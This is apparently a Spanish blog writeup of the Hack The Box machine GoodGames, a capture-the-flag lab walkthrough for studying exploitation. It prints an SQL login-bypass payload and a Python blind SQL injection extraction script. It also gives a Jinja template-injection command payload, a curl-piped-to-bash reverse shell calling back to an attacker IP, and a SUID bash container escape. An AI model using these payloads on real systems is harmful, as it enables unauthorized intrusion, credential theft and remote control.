---
title: GoodGames Writeup
author: xdann1
date: 2022-08-29
categories: [Writeup, HTB]
tags: [Linux, CTF, Easy, SQLi, Contenedor, SSTI, SUID, Linux]
image:
  path: ../../assets/img/commons/goodgames/goodgames.png
  width: 800
  height: 500
  alt: Banner Sizzle
---

Máquina Easy, nos aprovechamos de una inyección SQL para saltarnos el panel de login, convirtiendonos en el usuario administrador de la página, encontramos un subdominio y metemos en él unas credenciales que encontramos en otra inyección SQL de tipo Boolean Based, por último, nos aprovechamos de reutilizar contraseñas y un bash SUID.

## Recopilación de información

Primero vamos a comprobar la conectividad con la máquina.

```plaintext
❯ ping -c 1 10.10.11.130
PING 10.10.11.130 (10.10.11.130) 56(84) bytes of data.
64 bytes from 10.10.11.130: icmp_seq=1 ttl=63 time=32.0 ms

--- 10.10.11.130 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 32.028/32.028/32.028/0.000 ms
```

En la salida del comando anterior se puede ver un parámetro llamado `ttl`, gracias a este parámetro podemos saber que sistema operativo está corriendo en la máquina víctima.

* GNU/Linux = TTL 64
* Windows = TTL 128

En este caso, el sistema operativo que está corriendo en la máquina víctima es Linux.

Vamos a usar la herramienta `nmap` para descubrir que puertos están abiertos y que servicios están asociados a estos.

```plaintext
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.130 -oG allPorts
```

* -p- -> Escanea todos los puertos (65535)
* --open -> Muestra solo los puertos con un estatus "open"
* -sS -> Aplica un TCP SYN Scan
* --min-rate 5000 -> Indica que quiero emitir paquetes no más lentos que 5000 paquetes por segundo
* -vvv -> Muestra la información en pantalla a medida que se descubre
* -n -> Indica que no aplique resolución DNS
* -Pn -> Indica que no aplique el protocolo ARP
* 10.10.11.130 -> Dirección IP que se quiere escanear
* -oG allPorts -> Exporta el output a un fichero grepeable con nombre "allPorts"

Este sería el output del escaneo:

```plaintext
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-06 12:49 CEST
Scanning 10.10.11.130 [65535 ports]
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63
```

Ahora vamos a realizar un escaneo más profundo, también con `nmap` pero esta vez solamente lanzaremos scripts básicos de enumeración y analizaremos la versión de los puertos abiertos obtenidos anteriormente.

```plaintext
❯ nmap -p80 -sC -sV 10.10.11.130 -oN targeted
```

* -p80 -> Indica los puertos que se quieren escanear
* -sC -> Lanza scripts básicos de enumeración
* -sV -> Enumera la versión y servicio que está corriendo en los puertos
* 10.10.11.130 -> Dirección IP que se quiere escanear
* -oN targeted -> Exporta el output a un fichero en formato nmap con nombre "targeted"

Este sería el output del escaneo:

```plaintext
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-06 13:17 CEST
Nmap scan report for internal-administration.goodgames.htb (10.10.11.130)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.51
| http-title:     Flask Volt Dashboard -  Sign IN  | AppSeed
|_Requested resource was http://internal-administration.goodgames.htb/login
| http-server-header: 
|   Werkzeug/2.0.2 Python/3.6.7
|_  Werkzeug/2.0.2 Python/3.9.2
```

Los puertos abiertos y sus servicios asocidados son:

* 80/tcp -> http

Empezaremos enumerando la web, primero podemos empezar enumerando las tecnologías que está utilizando la página. Esto lo podemos hacer utilizando un plugin del navegador llamadado `Wappalyzer` o utilizando la herramienta `whatweb`.

```plaintext
❯ whatweb http://10.10.11.130
http://10.10.11.130 [200 OK] Bootstrap, Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[Werkzeug/2.0.2 Python/3.9.2], IP[10.10.11.130], JQuery, Meta-Author[_nK], PasswordField[password], Python[3.9.2], Script, Title[GoodGames | Community and Store], Werkzeug[2.0.2], X-UA-Compatible[IE=edge]
```

Lo más interesante que vemos utilizando `Wappalyzer` es que se está utilizando Flask, por lo que podemos intuir que vamos a tener que utilizar un SSTI (Server Side Template Injection) en algún momento. Ahora vamos a enumerar directorios con `dirsearch`.

```plaintext
❯ dirsearch -u http://10.10.11.130/ -x 404 -t 200
```

* -u http://10.10.11.130/ -> Indica la url
* -x 404 -> Oculta las peticiones que arrojan un código de estado 404
* -t 200 -> Indica el número de hilos que queremos usar

Las rutas que hemos encontrado son las siguientes:

```plaintext
Target: http://10.10.11.130/

[13:21:48] Starting: 
[13:22:26] 200 -  43KB - /blog
[13:22:44] 200 -   9KB - /login
[13:22:45] 302 -  208B - /logout  ->  http://10.10.11.130/
[13:22:55] 200 -   9KB - /profile
[13:22:58] 403 -  277B - /server-status
[13:22:58] 403 -  277B - /server-status/
[13:22:59] 200 -  33KB - /signup
```

---
## Busqueda de vulnerabilidades

Vemos que la página está relacionada con los videojuegos, en el fuzzing que hemos realizado antes vimos que tenemos un "/login" y un "/signup". Vamos a meternos a "/signup" para registrarnos en la página.

![Nos registramos]({{ 'assets/img/commons/goodgames/signup.png' | relative_url }}){: .center-image }
_Nos registramos_

Ya registrados en la página, vamos a iniciar sesión.

![Iniciamos sesión]({{ 'assets/img/commons/goodgames/login.png' | relative_url }}){: .center-image }
_Iniciamos sesión_

Al loguearnos vemos que nos redirige a una página en la que nos muestra los ajustes de nuestro usuario. No tenemos nada demasiado especial en estos ajustes, podemos intentar volver al login e intentar saltarnos el login con una inyección SQL de tal forma que entremos con el primer usuario, que por lo general es el administrador.

---
## Explotación

Recordemos que un panel de login nos dará como válido el intento de login cuando la query que se manda nos devuelva un valor "TRUE", es decir, necesitamos que el mail y la contraseña sean correctos para la misma entrada, por lo que si introducimos un mail y una contraseña válidos pero de diferentes cuentas no nos devolvera un valor "TRUE". 

Sabiendo que nos darán como válido el intento de login cuando la query devuelva un valor "TRUE" podemos aprovecharnos de esto intentando hacer que la query devuelva un valor "TRUE" sin proporcionar credenciales válidas inyectando SQL.

Nuestro payload para saltarnos el login sería el siguiente:

```plaintext
' or 1=1-- -
```

![Iniciamos sesión usando una inyección SQL]({{ 'assets/img/commons/goodgames/sql_injection.png' | relative_url }}){: .center-image }
_Iniciamos sesión usando una inyección SQL_

Vemos que nos ha funcionado, además, hemos iniciado sesión como un usuario "admin", vemos que tenemos un botón que antes no teníamos.

![Entramos como el administrador de la página]({{ 'assets/img/commons/goodgames/admin_login.png' | relative_url }}){: .center-image }
_Entramos como el administrador de la página_

Si nos metemos al botón que no teníamos antes veremos que nos redirigen a un dominio nuevo, vamos a apuntarnoslo en el "/etc/hosts" para poder entrar en él.

```plaintext
❯ echo "10.10.11.130 internal-administration.goodgames.htb" | sudo tee -a /etc/hosts
```

Ahora que tenemos el dominio relacionado con la IP, vamos a volver a entrar a la página.

![Entramos como el administrador de la página]({{ 'assets/img/commons/goodgames/flask.png' | relative_url }}){: .center-image }
_Entramos como el administrador de la página_

Vemos otro login, si intentamos saltarnos de nuevo el panel de login con una inyección SQL no conseguiremos nada, necesitaremos unas credenciales para autenticarnos en el panel. Si nos acordamos, el panel de login anterior nos reportaba algo distinto dependiendo si el login era correcto o no. Nos podemos aprovechar de esto utilizando una inyección SQL de tipo "Boolean Based" explico todo esto mejor en el siguiente [post](https://xdann1.github.io/posts/inyecciones-sql/).

He creado el siguiente script en python para explotar la inyección SQL.

```python
#!/usr/bin/python3

"""
Usage:
  sqli.py (-p <payload>) [-l] (-r <letras>) (-i <palabras>)

Options:
  -h --help     Muestra este panel.
  -l            Añade Limit a la query
  -r            Rango de letras por palabra
  -i            Rango de palabras
"""


from pwn import *
from docopt import docopt
import requests, signal, string

# Variables globales
url = "http://10.10.11.130/login"
header = {"Content-Type": "application/x-www-form-urlencoded"}

numbers = string.digits
letters = string.ascii_lowercase
simbols = r"-_:@!$%&()*+/;<=>?[\]^{|}.~"
dictionary = numbers + letters + simbols

result = ""

def def_handler(sig, frame):
    print("\n[+] Saliendo...")
    exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

def makeRequest(payload):
    data_post = {
            'email':'%s' % payload, 
            'password':'xdann1'
            }
    r = requests.post(url, data=data_post, headers=header)
    return r

if __name__ == "__main__":
    arguments = docopt(__doc__, version='Naval Fate 2.0')
    
    p2 = log.progress("Brute Forcing")
    p1 = log.progress("Output")

    for n in range(0, int(arguments["<palabras>"])):
        for i in range(1, int(arguments["<letras>"]) + 1):
            for c in dictionary:

                default = arguments["<payload>"]

                if arguments["-l"] == True:
                    limit = "(%s limit %d,1)" % (arguments["<payload>"], n)
                    default = limit

                payload = "a' or SUBSTR(%s ,%d,1)='%s'-- -" % (default, i, c)
                r = makeRequest(payload)

                p2.status("Probando en el resultado %d con el caracter %s en la posicion %d" % (n, c, i))

                if "Login Success" in r.text:
                    result += c
                    p1.status(result)

        result += " "
```

Vamos a sacar la base de datos actual, el usuario y la versión de la base de datos.

```plaintext
❯ python3 sqli.py -p "select concat(@@version,':',user(),':',database())" -l -r 40 -i 1
[┬] Brute Forcing: Probando en el resultado 0 con el caracter ~ en la posicion 40
[┬] Output: 8.0.27:main_admin@localhost:main
```

Vamos a sacar las bases de datos existentes.

```plaintext
❯ python3 sqli.py -p "select schema_name from information_schema.schemata" -l -r 20 -i 5
[├] Brute Forcing: Probando en el resultado 4 con el caracter > en la posicion 6
[├] Output: information_schema main
```

Vamos a sacar las tablas de la base de datos "main".

```plaintext
❯ python3 sqli.py -p "select table_name from information_schema.tables where table_schema='main'" -l -r 20 -i 5
[├] Brute Forcing: Probando en el resultado 2 con el caracter b en la posicion 10
[ ] Output: blog blog_comments user
```

Vamos a sacar las columnas de la tabla "user".

```plaintext
❯ python3 sqli.py -p "select column_name from information_schema.columns where table_schema='main' and table_name='user'" -l -r 10 -i 5
[▇] Brute Forcing: Probando en el resultado 4 con el caracter 4 en la posicion 2
[o] Output: email id name password
```

Vamos a sacar el contenido de la columna "name" y "password" ya que son los datos que nos piden en el login.

```plaintext
python3 sqli.py -p "select concat(name,':',password) from main.user" -l -r 45 -i 5
[......\.] Brute Forcing: Probando en el resultado 0 con el caracter l en la posicion 43
[......\.] Output: admin:2b22337f218b2d82dfc3b6f77e7cb8ec
```

Parece ser que la contraseña esté hasheada, vamos a ver que algoritmo de encriptación fue utilizado para poder desencriptarlo. Yo voy a utilizar [hash identifier](https://hashes.com/es/tools/hash_identifier).

![Vemos el tipo de algoritmo utilizado]({{ 'assets/img/commons/goodgames/hash.png' | relative_url }}){: .center-image }
_Vemos el tipo de algoritmo utilizado_

Se utilizó "MD5" para hashear la contraseña, es bastante fácil romper este hash, yo voy a utilizar [crackstation](https://crackstation.net/) para hacerlo.

![Crackeamos el hash]({{ 'assets/img/commons/goodgames/crack_hash.png' | relative_url }}){: .center-image }
_Crackeamos el hash_

Vamos a usar esta contraseña con el usuario encontrado anteriormente para autenticarnos contra el panel de login, quedarían así las credenciales "admin:superadministrator".

![Nos logueamos en el panel de flask]({{ 'assets/img/commons/goodgames/flask_login.png' | relative_url }}){: .center-image }
_Nos logueamos en el panel de flask_

Si vemos el panel de login veíamos la palabra "flask" en grande, además, si veis las tecnologías utilizadas en la página veréis que se está utilizando "flask", esto nos puede indicar que puede ir encaminado en un SSTI (Server Side Template Injection).

Vamos a probar el siguiente payload "\{\{7*7\}\}" en todos los lados para ver si encontramos el SSTI.

![Descubrimos un SSTI]({{ 'assets/img/commons/goodgames/ssti.png' | relative_url }}){: .center-image }
_Descubrimos un SSTI_

Hemos descubierto un SSTI en el apartado de nombre en nuestro usuario, vamos a ver si podemos ejecutar comandos, voy a usar el siguiente payload "\{\{ self._TemplateReference__context.cycler.\_\_init__.\_\_globals__.os.popen('id').read() \}\}".

![Conseguimos ejecutar comandos]({{ 'assets/img/commons/goodgames/command_injection.png' | relative_url }}){: .center-image }
_Conseguimos ejecutar comandos_

Vamos a mandarnos una reverse shell, yo voy a utilizar `curl` para hacerlo. Nos crearemos un archivo "index.html" que contenga una reverse shell, luego desde la máquina víctima apuntaremos a esta url y lo ejecutaremos con `bash`.

Este será el archivo "index.html":

```plaintext
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.9/443 0>&1
```

Vamos a crearnos un servidor web que aloje el archivo "index.html" y vamos a ponernos en escucha en el puerto 443.

```plaintext
❯ python3 -m http.server 80
❯ nc -nlvp 443
listening on [any] 443 ...
```

Ahora vamos a mandarnos la petición desde la máquina víctima, utilizaremos el siguiente payload: "\{\{ self._TemplateReference__context.cycler.\_\_init__.\_\_globals__.os.popen('curl http://10.10.14.9 \| bash').read() \}\}"

Nos debería haber llegado una reverse shell, vamos a tratar la tty para hacerla completamente funcional.

```plaintext
> script /dev/null -c bash
Script started, file is /dev/null
> CTRL + Z
suspended  nc -nlvp 443
❯ stty raw -echo; fg
nc -nlvp 443
	reset
reset: unknow terminal type unknown
Terminal type? xterm
> export SHELL=bash
> export TERM=xterm
> stty rows 41 columns 184
```

---
## Post-explotación

Lo primero, vamos a intentar ver la flag del usuario.

```plaintext
> cd /home
> ls 
augustus
cd augustus; cat user.txt
25cbadd89133afc4****************
```

Vemos que hemos entrado directamente como el usuario "root", vamos a comprobar si estamos en un contenedor comprobando la dirección IP.

```plaintext
> hostname -I
172.19.0.2
```

Vemos que estamos en un contenedor, la mayoría de veces docker nos genera una interfaz intermediaria para conectarnos con nuestro host, esto lo podemos mirar con:

```plaintext
> route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         172.19.0.1      0.0.0.0         UG    0      0        0 eth0
172.19.0.0      0.0.0.0         255.255.0.0     U     0      0        0 eth0
```

Vemos que existe una, vamos a ver si tenemos conexión con ella.

```plaintext
> ping -c 1 172.19.0.1
PING 172.19.0.1 (172.19.0.1) 56(84) bytes of data.
64 bytes from 172.19.0.1: icmp_seq=1 ttl=64 time=0.062 ms

--- 172.19.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.062/0.062/0.062/0.000 ms
```

Si nos fijamos e intentamos buscar el usuario "augustus" en el "/etc/passwd" veremos que no existe una entrada para este usuario, sin embargo, tenemos su home y si además vemos los permisos de su home veremos que apunta a un grupo que no existe, por lo que podemos deducir que el home del usuario está montad en nuestro contenedor. Vamos a comprobar esto.

```plaintext
> ls -l
total 4
-rw-r----- 1 root 1000 33 Sep  7 16:04 user.txt
> cat /etc/group | grep 1000
> mount | grep augustus
/dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)
```

Podemos intentar ver que puertos están abiertos en la interfaz que hemos encontrado (172.19.0.1), vamos a crear un script para enumerar los puertos.

```plaintext
> nano portscan.sh
bash: nano: command not found
```

Vemos que no vamos a poder utilizar nano,vim... Vamos a crearnoslo en nuestra máquina y luego lo pasaremos a la máquina víctima.

```bash
#!/bin/bash

function ctrl_c(){
    echo "[!] Saliendo..."
    exit 1
}

trap ctrl_c INT

for i in $(seq 1 65535); do
    timeout 1 bash -c "echo '' > /dev/tcp/172.19.0.1/$i" 2>/dev/null && echo "[*] Puerto Abierto: $i" &
done
```

Vamos a pasarlo a la máquina víctima para luego ejecutarlo.

```plaintext
❯ cat portscan.py | base64 -w 0
IyEvYmluL2Jhc2gKCmZ1bmN0aW9uIGN0cmxfYygpewogICAgZWNobyAiWyFdIFNhbGllbmRvLi4uIgogICAgZXhpdCAxCn0KCnRyYXAgY3RybF9jIElOVAoKZm9yIGkgaW4gJChzZXEgMSA2NTUzNSk7IGRvCiAgICB0aW1lb3V0IDEgYmFzaCAtYyAiZWNobyAnJyA+IC9kZXYvdGNwLzE3Mi4xOS4wLjEvJGkiIDI+L2Rldi9udWxsICYmIGVjaG8gIlsqXSBQdWVydG8gQWJpZXJ0bzogJGkiICYKZG9uZQo=
> echo 'IyEvYmluL2Jhc2gKCmZ1bmN0aW9uIGN0cmxfYygpewogICAgZWNobyAiWyFdIFNhbGllbmRvLi4uIgogICAgZXhpdCAxCn0KCnRyYXAgY3RybF9jIElOVAoKZm9yIGkgaW4gJChzZXEgMSA2NTUzNSk7IGRvCiAgICB0aW1lb3V0IDEgYmFzaCAtYyAiZWNobyAnJyA+IC9kZXYvdGNwLzE3Mi4xOS4wLjEvJGkiIDI+L2Rldi9udWxsICYmIGVjaG8gIlsqXSBQdWVydG8gQWJpZXJ0bzogJGkiICYKZG9uZQo=' | base64 -d > portscan.sh
```

Vamos a asignarle privilegios de ejecución al script y ejecutarlo.

```plaintext
> chmod +x portscan.sh
> ./portscan.sh
[*] Puerto Abierto: 22
[*] Puerto Abierto: 80
```

Vemos que está abierto el puerto 22 y 80, vamos a intentar conectarnos por `ssh` con el usuario "augustus" con la contraseña que habíamos encontrado antes (superadministrator).

```plaintext
> ssh augustus@172.19.0.1
augustus@172.19.0.1's password: superadministrator
> whoami
augustus
```

Como tenemos montado el home del usuario "augustus" en el docker y tenemos el usurio "root" podríamos traernos un binario con permisos SUID al home del usuario para poder escalar al usuario en el host.

```plaintext
> cp /bin/bash /home/augustus/ (docker)
> chmod 4777 bash (docker)
> chown root:root bash (docker)
> ./bash -p (ssh)
```

Ahora que hemos conseguido convertirnos en "root" en la máquina víctima, vamos a leer la flag del usuario root.

```plaintext
> cat /root/root.txt
8ghb158cf1469754f****************
```
